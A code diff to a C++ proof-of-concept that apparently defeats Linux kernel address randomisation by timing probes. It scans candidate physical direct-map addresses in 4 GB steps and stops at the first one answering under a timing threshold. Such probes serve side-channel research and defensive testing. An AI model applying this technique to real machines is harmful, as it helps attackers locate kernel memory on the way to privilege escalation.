@@ -12,8 +12,8 @@ using namespace std;
 Page p;
 myclock clk;
 int ntime=10;
-const uint64_t dm_base = 0xffff880000000000ull; // phys direct map base vaddr
-const int threshold = 200;
+const uint64_t dm_base = 0xffff880000000000ull; // 8800 - c7ff phys direct map base vaddr. can find in kernel docs
+const int threshold = 150;
 
 void warmup()
 {
@@ -94,10 +94,20 @@ void test_pa_aslr()
 {
     warmup();
     void *va = p.v.get();
-    uint64_t aslr_offset = 0, step = (1ull << 32), aslr_max = (1ull << 40); // try per 4GB (memory size)
+    uint64_t aslr_offset = 0, step = (1ull << 32), aslr_max = (1ull << 47); // try per 4GB (memory size)
+    int t;
 
     for (; aslr_offset < aslr_max; aslr_offset+=step)
-        cout << hex << dm_base << " + " << aslr_offset << " + " << p.p << " -> " << dec << try_pa(va, dm_base + aslr_offset + p.p) << " ns" << endl;
+    {
+        t = try_pa(va, dm_base + aslr_offset + p.p);
+        cout << hex << dm_base << " + " << aslr_offset << " + " << p.p << " -> " << dec << t << " ns";
+        if (t < threshold)
+        {
+            cout << " <- here" << endl;
+            break;
+        }
+        cout << endl;
+    }
 }
 
 int main()
